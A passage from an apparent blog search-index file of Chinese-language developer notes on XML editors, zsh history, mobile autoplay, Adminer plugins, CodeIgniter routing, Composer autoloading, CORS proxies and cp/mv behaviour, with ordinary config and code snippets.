rel=\"noopener\">最簡單實用的QXmlEdit，程式設計師你用了嗎？ - 每日頭條</a><br><a href=\"http://qxmledit.org/\" target=\"_blank\" rel=\"noopener\">QXmlEdit - simple XML editor</a></p>\n<p>這個終於可以開啟我的 XML 感動<br>功能還算滿不錯</p>\n<p>不知道官網抓下來檔案不能開<br>所以我用 <code>snap</code> 安裝</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt install snapd</span><br><span class=\"line\"><span class=\"comment\"># [Install qxmledit for Linux using the Snap Store | Snapcraft](https://snapcraft.io/qxmledit)</span></span><br><span class=\"line\">sudo snap install qxmledit</span><br><span class=\"line\"><span class=\"comment\"># 路徑在 /snap/bin/qxmledit</span></span><br><span class=\"line\">./snap/bin/qxmledit</span><br></pre></td></tr></table></figure>\n<h3 id=\"Visual-Studio-2019\"><a href=\"#Visual-Studio-2019\" class=\"headerlink\" title=\"Visual Studio 2019\"></a>Visual Studio 2019</h3><p>聽說 2019 有圖示介面可以看<br>但我不想裝大怪獸…</p>\n<p>參考來源:</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/2486758/how-to-visualize-an-xml-schema\" target=\"_blank\" rel=\"noopener\">xsd - How to visualize an XML schema? - Stack Overflow</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/XML_Schema_editors\" target=\"_blank\" rel=\"noopener\">XML Schema editors - Wikipedia</a></li>\n</ul>\n<h2 id=\"XSD-教學\"><a href=\"#XSD-教學\" class=\"headerlink\" title=\"XSD 教學\"></a>XSD 教學</h2><p><a href=\"https://blog.csdn.net/xxssyyyyssxx/article/details/50372503\" target=\"_blank\" rel=\"noopener\">XML：Schema、三种编写Schema的方式 - 熊诗言的博客 - CSDN博客</a><br><a href=\"https://www.itread01.com/content/1548934564.html\" target=\"_blank\" rel=\"noopener\">DTD與XSD的區別 - IT閱讀</a></p>\n","categories":["XML"],"tags":["xml","xsd"]},{"title":"Zsh設定開啟commmand紀錄","url":"/blog/2019/05/12/Zsh%E8%A8%AD%E5%AE%9A%E9%96%8B%E5%95%9Fcommmand%E7%B4%80%E9%8C%84/","content":"<p>最近重裝 zsh<br>就發現沒有 history 查詢功能(往上)<br>只要登出，就沒有這個很不方便<br>今天特別 google 一下</p>\n<a id=\"more\"></a>\n<p>只要在<code>~/.zshrc</code>最上面加</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">HISTSIZE=1000</span><br><span class=\"line\">SAVEHIST=1000</span><br><span class=\"line\">HISTFILE=~/.history</span><br></pre></td></tr></table></figure>\n<p>存檔就可以完成設定</p>\n<p>參考:<br><a href=\"http://zsh.sourceforge.net/Guide/zshguide02.html\" target=\"_blank\" rel=\"noopener\">A User’s Guide to the Z-Shell</a><br><a href=\"https://unix.stackexchange.com/questions/111718/command-history-in-zsh\" target=\"_blank\" rel=\"noopener\">Command history in Zsh - Unix &amp; Linux Stack Exchange</a></p>\n","categories":["實用工具"],"tags":["zsh"]},{"title":"audio和video在手機上不能autoplay問題","url":"/blog/2018/05/13/audio%E5%92%8Cvideo%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8A%E4%B8%8D%E8%83%BDautoplay%E5%95%8F%E9%A1%8C/","content":"<p>最近做專案都用到audio autoplay，但發現手機chrome不能自動播放，但是Firefox<br>這根手機瀏覽器設定有關係，現在像chrome預設都是用 媒體 自動關閉播放<br>我去設定看Firefox播放…，難怪在播放音樂清單網頁，Firefox在螢幕關閉<br>音樂還可以繼續放，但Chrome就不行了…，現在大概知道應該就是這個原因<br><a id=\"more\"></a><br>解決方法，就是手機要做一個按鈕給使用者去做播放<br>這邊有簡單用了，position:absoulte置中方法做一個東西<br><a href=\"http://jsbin.com/pejuvakuko/1/edit?html,css,output\" target=\"_blank\" rel=\"noopener\">http://jsbin.com/pejuvakuko/1/edit?html,css,output</a><br><figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\">$(<span class=\"string\">'svg'</span>).click(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    audio.play();</span><br><span class=\"line\">    $(<span class=\"string\">'svg'</span>).hide();</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure></p>\n<p>所以大概簡單做了一下這個<br>參照最近學會的absolute置中方法</p>\n<h3 id=\"loading\"><a href=\"#loading\" class=\"headerlink\" title=\"loading\"></a>loading</h3><p><a href=\"https://jsbin.com/diyavuyihi/1/edit?html,css,output\" target=\"_blank\" rel=\"noopener\">https://jsbin.com/diyavuyihi/1/edit?html,css,output</a></p>\n<p>下次做這個東西，希望別再踩到雷</p>\n<p>其實，手機瀏覽器可以讓使用者設定<br>但預設幾乎都是關閉的</p>\n<p><a href=\"https://www.ithome.com.tw/news/123231\" target=\"_blank\" rel=\"noopener\">Chrome 66讓數百萬款網頁遊戲消音，Google緊急調整自動播放政策 | iThome</a></p>\n","categories":["HTML"],"tags":["HTML","audio","mp4","video","autoplay"]},{"title":"adminer 管理DB工作裝套件記錄","url":"/blog/2018/08/17/adminer-%E7%AE%A1%E7%90%86DB%E5%B7%A5%E4%BD%9C%E8%A3%9D%E5%A5%97%E4%BB%B6%E8%A8%98%E9%8C%84/","content":"<p>這篇記錄adminer要怎麼裝套件，步驟真的不複雜<br>簡單記一下</p>\n<a id=\"more\"></a>\n<p>首先我需要一個table欄位置頂功能<br>我看我plugin都沒有<br><del>(沒有當然自幹XDD))</del><br>裝上<a href=\"https://addons.mozilla.org/zh-TW/firefox/addon/styl-us/\" target=\"_blank\" rel=\"noopener\">stylus]</a></p>\n<p>設定<br><figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">table</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">border-collapse</span>: separate;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">table</span> <span class=\"selector-tag\">td</span>,<span class=\"selector-tag\">table</span> <span class=\"selector-tag\">th</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">border-color</span>: <span class=\"built_in\">rgba</span>(153, 153, 153,.7)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">table</span> <span class=\"selector-tag\">thead</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">position</span>: sticky;</span><br><span class=\"line\">    <span class=\"attribute\">top</span>: <span class=\"number\">0px</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>其實簡單用到sticky<br>發現sticky要在table為spearate才有用…<br>但是sparate真的很難看<br>原本想用小border<br>但發現border<code>沒辦法縮的比1px還小</code><br><a href=\"https://stackoverflow.com/questions/13891177/css-border-less-than-1px\" target=\"_blank\" rel=\"noopener\">CSS border less than 1px - Stack Overflow</a></p>\n<p>這其實可以獨立寫一篇XD<br>最後參照stack overflow設定透明度<br>有看得比較順眼</p>\n<p>參考來源</p>\n<ul>\n<li><a href=\"https://stackoverflow.com/questions/13891177/css-border-less-than-1px\" target=\"_blank\" rel=\"noopener\">CSS border less than 1px - Stack Overflow</a></li>\n<li><a href=\"http://www.w3school.com.cn/cssref/pr_tab_border-collapse.asp\" target=\"_blank\" rel=\"noopener\">CSS border-collapse 属性</a></li>\n<li><a href=\"http://www.w3school.com.cn/cssref/pr_tab_border-spacing.asp\" target=\"_blank\" rel=\"noopener\">CSS border-spacing 属性</a></li>\n<li><a href=\"https://stackoverflow.com/questions/41882616/why-border-is-not-visible-with-position-sticky-when-background-color-exists\" target=\"_blank\" rel=\"noopener\">css - Why border is not visible with “position: sticky” when background-color exists? - Stack Overflow</a></li>\n</ul>\n<p>等等，還沒介紹adminer</p>\n<p>可以先新增一個資料夾<br>把adminer放裡面，再把順眼的adminer plugin抓下來<br>推薦<a href=\"https://raw.githubusercontent.com/vrana/adminer/master/plugins/struct-comments.php\" target=\"_blank\" rel=\"noopener\">struct-comments</a><br>設定一個<code>index.php</code><br><a href=\"https://www.adminer.org/en/plugins/#use\" target=\"_blank\" rel=\"noopener\">使用套件教學</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">adminer_object</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// required to run any plugin</span></span><br><span class=\"line\">    <span class=\"keyword\">include_once</span> <span class=\"string\">\"./plugins/plugin.php\"</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// autoloader</span></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (glob(<span class=\"string\">\"plugins/*.php\"</span>) <span class=\"keyword\">as</span> $filename) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include_once</span> <span class=\"string\">\"./$filename\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    $plugins = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"comment\">// specify enabled plugins here</span></span><br><span class=\"line\">        <span class=\"keyword\">new</span> AdminerDumpXml,</span><br><span class=\"line\">        <span class=\"keyword\">new</span> AdminerTinymce,</span><br><span class=\"line\">        <span class=\"keyword\">new</span> AdminerFileUpload(<span class=\"string\">\"data/\"</span>),</span><br><span class=\"line\">        <span class=\"keyword\">new</span> AdminerSlugify,</span><br><span class=\"line\">        <span class=\"keyword\">new</span> AdminerTranslation,</span><br><span class=\"line\">        <span class=\"keyword\">new</span> AdminerForeignSystem,</span><br><span class=\"line\">    );</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/* It is possible to combine customization and plugins:</span></span><br><span class=\"line\"><span class=\"comment\">    class AdminerCustomization extends AdminerPlugin &#123;</span></span><br><span class=\"line\"><span class=\"comment\">    &#125;</span></span><br><span class=\"line\"><span class=\"comment\">    return new AdminerCustomization($plugins);</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> AdminerPlugin($plugins);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// include original Adminer or Adminer Editor</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"./adminer.php\"</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"http://php.net/manual/en/function.glob.php\" target=\"_blank\" rel=\"noopener\">PHP: glob - Manual</a><br>算是很神的method<br>可以用神奇的方法抓到想要的檔案<br>自動載入也可以參考__autoload</p>\n<p>當然也可以直接去github找人家用好的adminer版本<br><a href=\"https://github.com/dg/adminer-custom\" target=\"_blank\" rel=\"noopener\">dg/adminer-custom: Customizations for Adminer, the best database management tool written in PHP.</a><br>不過我還是覺得原版看比較順眼</p>\n","categories":["PHP"],"tags":["adminer"]},{"title":"codeigniter設定router踩雷","url":"/blog/2019/05/03/codeigniter%E8%A8%AD%E5%AE%9Arouter%E8%B8%A9%E9%9B%B7/","content":"<p>今天設定 Codeigniter 路由的時候<br>發現怎麼不能正常倒到 Default_controller<br>後來發現不能設定 <strong>Contoller 第二層資料夾!!!</strong><br>好了，結束 XD</p>\n<a id=\"more\"></a>\n<p>最後，不太想動到原本路徑程式，<br>所以 Welcome.php 做<code>inlcude application\\contoller\\ooo\\xxx.php</code>繼承(extends)<br>完成!!!!</p>\n<p><strong>注意：設邊由於所有 index.php 關係，所以 include 要由底層資料夾開始</strong></p>\n<p>其他小記:<br>怕沒有時間記錄，小記在這邊</p>\n<ul>\n<li><a href=\"http://blog.text.wiki/2017/10/31/git-webhooks-for-php.html\" target=\"_blank\" rel=\"noopener\">Git webhook 实现自动部署教程</a></li>\n<li><a href=\"https://blog.51cto.com/3chou/2294231\" target=\"_blank\" rel=\"noopener\">Windows 系统中的 Linux—WSL 安装及简单使用-水幕青辰的网络笔记-51CTO 博客</a></li>\n</ul>\n","categories":["PHP"],"tags":["codeigniter"]},{"title":"composer使用psr0,psr4,classmap,files自動載入筆記心得","url":"/blog/2019/01/19/composer%E4%BD%BF%E7%94%A8psr0-psr4-classmap-files%E8%87%AA%E5%8B%95%E8%BC%89%E5%85%A5%E7%B4%80%E9%8C%84/","content":"<p>上次小玩 composer 的自動載入<br>但今天使用 autoload<br>發現我還不是很了解他的運作原理<br>psr0,psr4 差別也看不是很出來他們的差別<br>不過說真的，網路上幾乎都是忽略掉 psr0<br>可能也不要花太多心力在上面吧</p>\n<a id=\"more\"></a>\n<p>先講講 composer 自動載入原理<br><del>原本想說他是載入 php 會自動載入全部</del><br>但無聊看了一下<code>vendor/autoload.php</code>原碼<br>裡面有用到<code>spl_autoload</code><br>所以應該都是基於這個方式去自動載入</p>\n<p>但這種自動載入跟<code>檔名</code>跟<code>Class類別</code>有關係</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">我之前測試classmap，只要檔名沒對到，`use function xxx`沒吃到</span><br><span class=\"line\">但是調整對的檔名，`use function xxx`就會吃到</span><br></pre></td></tr></table></figure>\n<p>上面那段是我無聊自己試的，其實正常不會用 use function<br>一個 php 一個 class 是最好的方式</p>\n<h2 id=\"classmap\"><a href=\"#classmap\" class=\"headerlink\" title=\"classmap\"></a>classmap</h2><p>這個指定相關目錄裡所有 php 都會載入 php 裡面的 class<br>但 php 未包含 class 不會載入進去<br>這個也很常在 composer 看到<br>但先說說我自己測試踩到一個雷</p>\n<p>當載入沒宣告<code>namespace</code>時候<br>預設是會自動載入到<code>全域 namespace</code><br>但是全域 namespace 不須要做<code>use xxx</code><br>這時候做<code>use xxx</code>會發生錯誤<br>使用會造成錯誤<br><code>Warning: The use statement with non-compound name &#39;xxx&#39; has no effect</code><br>這個別的網頁很少介紹這個<br>詳細 laravel 的 dataseeder.php 就是這樣設定的<br>檔案 autoload_classmap.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'DatabaseSeeder'</span> =&gt; $baseDir . <span class=\"string\">'/database/seeds/DatabaseSeeder.php'</span>,</span><br></pre></td></tr></table></figure>\n<h2 id=\"files\"><a href=\"#files\" class=\"headerlink\" title=\"files\"></a>files</h2><p>載入指定的 PHP 都會載入進來，重點 class 也都會，其實這邊也可以做 namespace<br>但好像大家用全域 namespace 比較多<br>還是別亂用好了 XD</p>\n<h2 id=\"PSR0\"><a href=\"#PSR0\" class=\"headerlink\" title=\"PSR0\"></a>PSR0</h2><p>這篇已經被廢棄了!!建議可以跳過這邊<br>不然會跟 PSR4 搞混，千萬不要像我走火入魔!!!!<br>現在我還沒有看過 composer.json 有用到</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">\"psr-0\": &#123;</span><br><span class=\"line\">    \"Psr0\\\\Lib\\\\\": \"psr0/lib/src/\"</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n<p><strong>上面簡單講，就是”psr0/lib/src/“所存在 PSR0/lib/根目錄地方</strong><br>所以對應項面檔案位置 psr0/lib/src/<strong>Psr0/Lib/Psr0LibClass.php</strong></p>\n<p><code>psr0/lib/src/Psr0/Lib/Psr0LibClass.php</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// psr-0: \"Psr0\\\\Lib\\\\\": \"psr0/lib/src/\"</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Psr0</span>\\<span class=\"title\">Lib</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Psr0LibClass</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">__CLASS__</span> . <span class=\"string\">\"@\"</span> . <span class=\"keyword\">__FILE__</span> . PHP_EOL;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"PSR4\"><a href=\"#PSR4\" class=\"headerlink\" title=\"PSR4\"></a>PSR4</h2><p>這個也很常在 composer.json 看到<br>相信剛入門一定對下面倒數兩行傻了</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">\"psr-4\": &#123;</span><br><span class=\"line\">    \"Psr4\\\\Lib\\\\\": \"psr4/lib/src/\",</span><br><span class=\"line\">    \"App\\\\Controllers\\\\\": \"app/controllers/\",</span><br><span class=\"line\">    \"App\\\\Models\\\\\": \"app/models/\"</span><br></pre></td></tr></table></figure>\n<p>psr4/lib/src/Psr4LibClass.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// psr-4: \"Psr4\\\\Lib\\\\\": \"psr4/lib/src/\"</span></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">Psr4</span>\\<span class=\"title\">Lib</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Psr4LibClass</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">index</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">__CLASS__</span> . <span class=\"string\">\"@\"</span> . <span class=\"keyword\">__FILE__</span> . PHP_EOL;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>App\\\\Controllers\\\\</code>和<code>App\\\\Models\\\\</code>怎麼可以投同時宣告<br>這邊先講我怎麼看這段在幹嘛<br><strong>psr4/lib/src/目錄下，都已 Psr4\\Lib\\ namespace 宣告為主</strong><br>以此類推<br><code>App\\\\Controllers\\\\</code>→<code>app/controllers/</code><br><code>App\\\\Models\\\\</code>→<code>app/models/</code></p>\n<p>好了，<strong><code>App\\\\Controllers\\\\</code>和<code>App\\\\Models\\\\</code>怎麼可以投同時宣告</strong><br>為什麼不要用<code>&#39;App\\\\&#39;: &#39;app&#39;</code><br><a href=\"https://www.bilibili.com/video/av14240417?from=search&amp;seid=7612427357758143985\" target=\"_blank\" rel=\"noopener\">千锋最新 php 视频教程完整 psr4Autoload 类_哔哩哔哩 (゜-゜)つロ 干杯~-bilibili</a><br>看這邊解釋，講如這樣用<code>App/Controllers/Contollers.php</code><br>不需要寫<code>use App/Controllers/Controllers</code>這麼繞口令</p>\n<p>當然 App 資料夾不需要全部東西當 namespace，或者也可以把 namespace 客製化改短一點<br>EX:</p>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">\"Controllers\\\\\": \"app/controllers/\",</span><br><span class=\"line\">\"Models\\\\\": \"app/models/\"</span><br></pre></td></tr></table></figure>\n<p>相信看很難懂，實作比較快<br><a href=\"https://my.oschina.net/sallency/blog/893518\" target=\"_blank\" rel=\"noopener\">composer 自动载入 autoload 的使用详解 psr0/psr4/classmap/files - big_cat - 开源中国</a><br>看這裡面內容，把所有 code 都在本機跑一下，很容易理解<code>php -S 0.0.0.0:8000</code></p>\n<h2 id=\"autoload-他怎麼知道載入你自己-lib，跟-vendor-上的-lib\"><a href=\"#autoload-他怎麼知道載入你自己-lib，跟-vendor-上的-lib\" class=\"headerlink\" title=\"autoload 他怎麼知道載入你自己 lib，跟 vendor 上的 lib\"></a>autoload 他怎麼知道載入你自己 lib，跟 vendor 上的 lib</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// autoload_classmap.php @generated by Composer</span></span><br><span class=\"line\"></span><br><span class=\"line\">$vendorDir = dirname(dirname(<span class=\"keyword\">__FILE__</span>));</span><br><span class=\"line\">$baseDir = dirname($vendorDir);</span><br><span class=\"line\"></span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"string\">'App\\\\VoteOption'</span> =&gt; $baseDir . <span class=\"string\">'/app/VoteOption.php'</span>,</span><br><span class=\"line\">    <span class=\"string\">'ArithmeticError'</span> =&gt; $vendorDir . <span class=\"string\">'/symfony/polyfill-php70/Resources/stubs/ArithmeticError.php'</span>,</span><br></pre></td></tr></table></figure>\n<p><code>$vendorDir</code>試紙 vendor 路徑<br>當然做 dirname 就能抓到<code>$baseDir</code>，你自己寫的程式自然就會讀到</p>\n<h2 id=\"總結\"><a href=\"#總結\" class=\"headerlink\" title=\"總結\"></a>總結</h2><p>最後，新增 psr0/psr4 跟修改 classmap，記得做<code>compser dump-autoload</code><br>你說我怎麼沒有提到 psr0<code>_</code>問題，我已經不想深入太多，可參考別的頁面說明<br>最後 psr 是 Fig 訂出來的規範，實際你要怎麼載入 php 有很多種方法<br>當然最好<strong>一個檔案一個 class</strong>，大小寫路徑可能也要注意(雖然 php namespace 不分大小寫…)<br>但是了解這種載入機制，以後寫元件都是比較好的切入</p>\n<p>範例可以參考<br><a href=\"https://github.com/malagege/PHP_composer_autoload_demo\" target=\"_blank\" rel=\"noopener\">malagege/PHP_composer_autoload_demo: PHP composer autoload 簡單實例 demo</a></p>\n<p>參考來源:</p>\n<ul>\n<li><a href=\"https://my.oschina.net/sallency/blog/893518\" target=\"_blank\" rel=\"noopener\">composer 自动载入 autoload 的使用详解 psr0/psr4/classmap/files - big_cat - 开源中国</a></li>\n<li><a href=\"https://segmentfault.com/a/1190000006686978\" target=\"_blank\" rel=\"noopener\">psr-0 和 psr-4 的区别 - shuizhuniurou - SegmentFault 思否</a></li>\n<li><a href=\"https://stackoverflow.com/questions/24868586/what-are-the-differences-between-psr-0-and-psr-4\" target=\"_blank\" rel=\"noopener\">php - What Are the Differences Between PSR-0 and PSR-4? - Stack Overflow</a></li>\n<li><a href=\"https://laravelacademy.org/post/7074.html\" target=\"_blank\" rel=\"noopener\">深入学习 Composer 自动加载（autoload）机制 - Laravel 学院</a></li>\n<li><a href=\"http://blog.tonycube.com/2016/09/php-psr-4-autoloader.html\" target=\"_blank\" rel=\"noopener\">PHP PSR-4 Autoloader 機制 | Tony Blog</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/38127465\" target=\"_blank\" rel=\"noopener\">PHP Composer 以及 PSR 规范 - 知乎</a></li>\n</ul>\n","categories":["PHP"],"tags":["composer","autoload"]},{"title":"cors跨域資源共享代理(proxy)小記","url":"/blog/2018/12/13/cors%E8%B7%A8%E5%9F%9F%E8%B3%87%E6%BA%90%E5%85%B1%E4%BA%AB%E4%BB%A3%E7%90%86-proxy-%E5%B0%8F%E8%A8%98/","content":"<p>最近使用cors anywhere<br>簡單使用<br>有遇到不該遇到的雷<br>這邊小記</p>\n<a id=\"more\"></a>\n<h1 id=\"CORS-ANYWHERE\"><a href=\"#CORS-ANYWHERE\" class=\"headerlink\" title=\"CORS-ANYWHERE\"></a>CORS-ANYWHERE</h1><p>官網：<a href=\"https://cors-anywhere.herokuapp.com/\" target=\"_blank\" rel=\"noopener\">https://cors-anywhere.herokuapp.com/</a><br>Github：<a href=\"https://github.com/Rob--W/cors-anywhere/\" target=\"_blank\" rel=\"noopener\">https://github.com/Rob--W/cors-anywhere/</a></p>\n<p>可以到官網clone下來，執行node js</p>\n<h2 id=\"踩雷小記\"><a href=\"#踩雷小記\" class=\"headerlink\" title=\"踩雷小記\"></a>踩雷小記</h2><p>原本我就簡單使用<code>fetch</code>呼叫cors-anywhere，但是一直失敗<br>其實我也是英文苦守<br>當下沒注意到有明顯提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Missing required request header. Must specify one of: origin,x-requested-with</span><br></pre></td></tr></table></figure>\n<p>fetch並不會塞<code>x-requested-with</code><br>當然在postman塞<code>x-requested-with</code><br>就可以work了</p>\n<h2 id=\"Corsproxy\"><a href=\"#Corsproxy\" class=\"headerlink\" title=\"Corsproxy\"></a>Corsproxy</h2><p>可以全局安裝<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install -g corsproxy</span><br><span class=\"line\">corsproxy</span><br></pre></td></tr></table></figure></p>\n<p>但一樣有上面的雷<br>說不定只有我會踩到orz</p>\n<p>也可以去docker hub找</p>\n","categories":["實用工具"],"tags":["cors"]},{"title":"cp 複製檔案可能沒注意的事情","url":"/blog/2020/01/10/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/","content":"<p>最近由於程式做很多檔案處理<br>就在想 cp 到目的資料夾裡面 ls 是否能看到資料<br>不過原本猜應該不會<br>但實驗結果卻不是我想得這樣<br>最後感覺我們被 GUI 介面受很多影響<br><del>其實是無聊探討一些不重要的事情(哈哈)</del></p>\n<a id=\"more\"></a>\n<h2 id=\"產生大檔案\"><a href=\"#產生大檔案\" class=\"headerlink\" title=\"產生大檔案\"></a>產生大檔案</h2><p>由於我用 PI 效能較差的電腦產生大檔案<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">dd <span class=\"keyword\">if</span>=/dev/zero of=file.txt count=1024 bs=1024    <span class=\"comment\"># 產生 1MB</span></span><br><span class=\"line\">dd <span class=\"keyword\">if</span>=/dev/zero of=file.txt count=1024000 bs=1024 <span class=\"comment\"># 產生 1G</span></span><br></pre></td></tr></table></figure></p>\n<p>參考: <a href=\"https://skorks.com/2010/03/how-to-quickly-generate-a-large-file-on-the-command-line-with-linux/\" target=\"_blank\" rel=\"noopener\">How To Quickly Generate A Large File On The Command Line (With Linux) - Skorks</a></p>\n<h2 id=\"簡單測試\"><a href=\"#簡單測試\" class=\"headerlink\" title=\"簡單測試\"></a>簡單測試</h2><p>其實就是把大檔案複製到別的資料夾</p>\n<p>這邊先說正常<strong>沒中斷</strong>複製檔案中<br>目的資料夾檔案可以<code>ls</code>出來!!!<br>在想處理中檔案是否有別的方法隱藏<br><a href=\"https://superuser.com/questions/45224/is-there-a-way-to-tell-if-a-file-is-done-copying\" target=\"_blank\" rel=\"noopener\">scp - Is there a way to tell if a file is done copying? - Super User</a><br>有找到更好方式在做紀錄</p>\n<ol>\n<li><p>有趣結論 1<br>不過，我 <code>Ctrl+C</code> 竟然還會存在<br>這有點出乎我的意料<br>平常我們用 Window 桌面(不管是不是Linux)複製中檔案案取消都目的資料夾檔案一定會不見!!!</p>\n</li>\n<li><p>有趣結論 2<br>不管事做<code>kill -9</code>或<code>kill -1</code>都是不會刪除…</p>\n</li>\n<li><p>有趣結論 3<br>cp 檔案中…在別的 command line 做刪除動作<br>竟然 cp command line 指令不會中斷跳出錯誤…</p>\n</li>\n</ol>\n<p>但我想這種種跡象跟 Linux 檔案系統有關係<br>回想過去我們傳 FTP 跟 轉影音檔到一半中斷<br>我們檔案並不會刪除<br>我們在 Window 複製檔案中，我們 GUI 介面可以看到檔案圖示<br>但按取消後，圖示會跟著刪除<br>這我想是作業系統有幫我們做刪除動作</p>\n<h2 id=\"最後-mv\"><a href=\"#最後-mv\" class=\"headerlink\" title=\"最後 mv\"></a>最後 mv</h2><p>我在想 mv 應該也是類似這樣<br><del>cp 完到別的地方，會做刪除動作</del>馬上打臉<br>答案是錯的，同一個 HD 會很快(這應該跟作業系統有關係)</p>\n<p>但不同 HD 跟我 cp 實驗一模一樣!!!<br>中斷會留檔案<br>至於 window 系統我就不研究了</p>\n<p><del>又研究沒什麼軟用的實驗了</del></p>\n<p>不相關彩蛋<br>預計 jQuery 和 inotify-tools 和 DinD(Docker in Docker) &amp; RabbitMQ 要記錄…(我還記得的話之後會寫…怕忘記)</p>\n<ul>\n<li><a href=\"https://docs.docker.com/develop/sdk/examples/\" target=\"_blank\" rel=\"noopener\">Examples using the Docker Engine SDKs and Docker API | Docker Documentation</a></li>\n<li><a href=\"https://blog.csdn.net/halcyonbaby/article/details/43499409\" target=\"_blank\" rel=\"noopener\">[docker]privileged参数<em>docker,privileged</em>追寻神迹-CSDN博客</a></li>\n<li><a href=\"https://css-tricks.com/snippets/jquery/make-jquery-contains-case-insensitive/\" target=\"_blank\" rel=\"noopener\">Make jQuery :contains Case-Insensitive | CSS-Tricks</a></li>\n<li><a href=\"https://jsfiddle.net/bipen/dyfRa/\" target=\"_blank\" rel=\"noopener\">jquery :contains case-Insensitive - JSFiddle</a></li>\n<li><a href=\"https://www.centos.bz/2012/06/inotify-tools-introduction/\" target=\"_blank\" rel=\"noopener\">inotify-tools使用方法介绍-Linux运维日志</a></li>\n<li><a href=\"https://www.centos.bz/2018/01/centos-6-9%E4%B8%8Ainotify-tools-%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/\" target=\"_blank\" rel=\"noopener\">CentOS 6.9上inotify-tools 安装及使用方法-Linux运维日志</a></li>\n<li><a href=\"https://jackyu.cn/tech/rsync-plus-inotify-tools/\" target=\"_blank\" rel=\"noopener\">rsync + inotify-tools 实现 